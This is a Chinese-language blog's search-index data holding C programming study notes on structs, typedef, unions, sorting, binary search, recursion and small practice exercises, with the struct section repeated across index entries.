结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构指针"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构作为函数参数"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#输入结构解决方案"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#c指向结构的指针"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构数组"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构中的结构"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#嵌套的结构"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构中的结构的数组"},{"categories":["Programing"],"content":"\r11.3联合\r自定义数据类型(typedef)c语言提供了一个叫做typedef的功能来声明一个已有的数据类型的新名字 比如： typedef int Length 使得 Length 成为 int 类型的别名 这样，Length 这个名字就可以代替int出现在变量定义和参数声明的地方了 Length a,b,len; Length numbers[10]; Typedef用来声明新的类型的名字 新的名字是某种类型的别名 改善了程序的可读性 (第一个是原来的名字，后面的是新名字) 联合​ 储存时，所有的成员共享一个空间，同一时间只有一个成员是有效的，union的大小事其最大的成员。 ​ 初始化时，对第一个成员做初始化。 ","date":"2023-11-17","objectID":"/c_language_notes/:11:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#113联合"},{"categories":["Programing"],"content":"\r11.3联合\r自定义数据类型(typedef)c语言提供了一个叫做typedef的功能来声明一个已有的数据类型的新名字 比如： typedef int Length 使得 Length 成为 int 类型的别名 这样，Length 这个名字就可以代替int出现在变量定义和参数声明的地方了 Length a,b,len; Length numbers[10]; Typedef用来声明新的类型的名字 新的名字是某种类型的别名 改善了程序的可读性 (第一个是原来的名字，后面的是新名字) 联合​ 储存时，所有的成员共享一个空间，同一时间只有一个成员是有效的，union的大小事其最大的成员。 ​ 初始化时，对第一个成员做初始化。 ","date":"2023-11-17","objectID":"/c_language_notes/:11:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#自定义数据类型typedef"},{"categories":["Programing"],"content":"\r11.3联合\r自定义数据类型(typedef)c语言提供了一个叫做typedef的功能来声明一个已有的数据类型的新名字 比如： typedef int Length 使得 Length 成为 int 类型的别名 这样，Length 这个名字就可以代替int出现在变量定义和参数声明的地方了 Length a,b,len; Length numbers[10]; Typedef用来声明新的类型的名字 新的名字是某种类型的别名 改善了程序的可读性 (第一个是原来的名字，后面的是新名字) 联合​ 储存时，所有的成员共享一个空间，同一时间只有一个成员是有效的，union的大小事其最大的成员。 ​ 初始化时，对第一个成员做初始化。 ","date":"2023-11-17","objectID":"/c_language_notes/:11:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#联合"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include\u003cstdio.h\u003e #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } for(k=0;k\u003cn-1;k++){ index=k; for(i=k+1;i\u003cn;i++){ if(a[i]\u003ca[index]){ index=i; } } temp=a[index]; a[index]=a[k]; a[k]=temp; } printf(\"After sorted:\"); for(i=0;i\u003cn;i++){ printf(\"%d\",a[i]); } printf(\"\\n\"); return 0; } 冒泡排序 #include\u003cstdio.h\u003e #define MAXN 10 void swap(int*px, int*py); void bubble(int a[],int n); int main(){ int n,a[MAXN]; int i; printf(\"Enter n(n\u003c=10):\"); scanf(\"%d\",\u0026n); printf(\"Enter %d characters:\\n\",n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } bubble(a,n); printf(\"After sorted:\"); for(i=0;i\u003cn;i++){ printf(\"%3d\",a[i]); } return 0; } void swap(int *px,int *py){ int t; t=*px; *px=*py; *py=t; } void bubble(int a[],int n){ int i,j,t; for(i=1;i\u003cn;i++){ for(j=0;j\u003cn-i;j++){ if(a[j]\u003ea[j+1]){ swap(\u0026a[j],\u0026a[j+1]); } } } } 分类统计 #include\u003cstdio.h\u003e #define MAXN 8 int main(){ int n,i,response; int a[MAXN+1]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=1;i\u003c=n;i++){ a[i]=0; } for(i=1;i\u003c=n;i++){ printf(\"Enter your response:\"); scanf(\"%d\",\u0026response); if(response\u003e=1\u0026\u0026response\u003c=MAXN){ a[response]++; }else{ printf(\"Invalid number!\\n\"); } } printf(\"result:\\n\"); for(i=1;i\u003c=n;i++){ printf(\"%4d%4d\\n\",i,a[i]); } return 0; } 二分查找法 #include\u003cstdio.h\u003e int main(){ int low,high,mid,n=10,x; int a[10]={1,2,3,4,5,6,7,8,9,10}; printf(\"Enter x: \"); scanf(\"%d\",\u0026x); low=0; high=n-1; while(low\u003c=high){ mid=(low+high)/2; if(x==a[mid]){ break; }else if(x\u003ea[mid]){ low=mid+1; }else{ high=mid-1; } } if(low\u003c=high){ printf(\"Index is %d\\n\",mid); }else{ printf(\"Not Found\\n\"); } return 0; } 递归函数递归是一种独特的定义方式 如果在定义某个事物的时候，又直接或间接地引用了这个事物本身，就称之为递归定义 例如，将n的阶乘定义为n-1的阶乘乘以n，就是一个递归定义 使用递归算法求n的阶乘： #include\u003cstdio.h\u003e long fact(int n); int main(){ int m=0,n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); m=fact(n); printf(\"n!=%d\",m); return 0; } long fact(int n){ int f=0; if(n==1){ f=1; }else{ f=n*fact(n-1); } return f; } ","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#121算法"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#选择排序"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#冒泡排序"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#分类统计"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二分查找法"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#递归函数"},{"categories":["Programing"],"content":"\r12.1算法常用排序算法：选择排序，冒泡排序，插入排序 选择排序 #include #define MAXN 10 int main(){ int i,index,k,n,temp; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:12:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#使用递归算法求n的阶乘"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m\u003cn)，包括m和n #include\u003cstdio.h\u003e int sum(int m, int n); int main(){ int m,n; printf(\"Enter m n ,(m\u003cn):\"); scanf(\"%d %d\",\u0026m,\u0026n); printf(\"sum = %d\\n\",sum(m,n)); return 0; } int sum(int m,int n){ int sum=0; while(m\u003c=n){ sum=sum+m; m++; } return sum; } 2.计算摄氏温度 #include\u003cstdio.h\u003e int main(){ double f,c; printf(\"Enter F:\"); scanf(\"%lf\",\u0026f); c=5*(f-32)/9; printf(\"Celsius = %.1lf\",c); return 0; } 3.最大公约数和最小公倍数 可以先用辗转相除法求出最大公约数，然后a*b/[最大公约数]=最小公倍 #include\u003cstdio.h\u003e int main(){ int m,n,t,k; int a,b; scanf(\"%d %d\",\u0026m,\u0026n); a=m; b=n; if(n\u003em){ t=m; m=n; n=t; } while(n!=0){ t=m%n; m=n; n=t; } k=a*b/m; printf(\"%d %d\",m,k); return 0; } 4.统计字符输入10个字符，统计其中英文字母，空格或回车，数字字符和其他字符的个数 #include\u003cstdio.h\u003e int main(){ char a; int blank=0,digit=0,letter=0,other=0; for(int i=1;i\u003c=10;i++){ a=getchar(); switch (a){ case ' ': case '\\n': blank++; break; case '1':case '2':case '3': case '4': case '5': case '6':case '7':case '8': case '9': case '0': digit++; break; case 'a':case 'b':case 'c':case 'd':case 'e':case 'f':case 'g':case 'h': case 'i':case 'j':case 'k':case 'l':case 'm':case 'n':case 'o':case 'p': case 'q':case 'r':case 's':case 't':case 'u':case 'v':case 'w':case 'x': case 'y':case 'z': letter++; break; default: other++; break; } } printf(\"blank:%d,digit:%d,other=%d,letter:%d\\n\",blank,digit,other,letter); return 0; } 5.输出闰年 #include\u003cstdio.h\u003e int main(){ int year; scanf(\"%d\",\u0026year); if(year%100==0){ if(year%400==0){ printf(\"闰年\"); }else{ printf(\"不是闰年\"); } } else if(year%4==0){ printf(\"r闰年\"); } else{ printf(\"不是闰年\"); } return 0; } 6.判断水仙花数 #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cmath.h\u003e int main() { int n; int t,z = 0; scanf(\"%d\", \u0026n); int min = pow(10, n - 1); int max = pow(10, n); for(int i=min;i\u003cmax;i++) { z = i; t = 0; while(z \u003e 0) { t = t+pow(z % 10, n); z = z / 10; } if (i == t) { printf(\"%d\\n\", i); } } return 0; } 